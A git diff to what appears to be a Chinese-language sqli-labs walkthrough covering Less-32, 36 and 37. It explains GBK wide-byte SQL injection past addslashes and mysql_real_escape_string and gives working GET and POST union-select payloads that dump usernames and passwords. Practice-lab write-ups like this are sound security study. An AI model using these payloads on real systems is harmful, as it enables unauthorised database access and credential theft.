@@ -1050,7 +1050,7 @@ $sql = "UPDATE users SET PASSWORD='$pass' where username='$username' and passwor
 
 ### Less-32
 
-题目中对`' " \`进行了转义处理,转义为`\' \" \\`,使用宽字节注入进行绕过
+题目中对`' " \`进行了转义处理(`addslashes`),转义为`\' \" \\`,使用宽字节注入进行绕过
 
 mysql在使用GBK编码时,会认为两个字符为一个汉字,例如`%c4%e3`就是一个汉字(前一个ASCII码要大于128)
 
@@ -1079,3 +1079,26 @@ mysql在使用GBK编码时,会认为两个字符为一个汉字,例如`%c4%e3`�
 不需要构造闭合
 
 传入`?id=-1 union select 1,(select group_concat(username) from users),(select group_concat(password) from users)%23`返回用户名和密码
+
+### Less-36
+
+题目提示存在`mysql_real_escape_string`
+
+`mysql_real_escape_string()`调用mysql库的函数`mysql_real_escape_string`,在以下字符前添加反斜杠`\x00, \n, \r, \, ', "`和`\x1a`
+
+同样可以使用宽字节注入
+
+传入`?id=-1%df' union select 1,(select group_concat(username) from users),(select group_concat(password) from users)%23`得到用户名和密码
+
+### Less-37
+
+使用POST传参
+
+传入`uname=a%df' union select (select group_concat(username) from users),(select group_concat(password) from users)%23&passwd=a&submit=Submit`返回用户名和密码
+
+## Stacked Injections
+
+>堆叠注入
+
+### Less-38
+
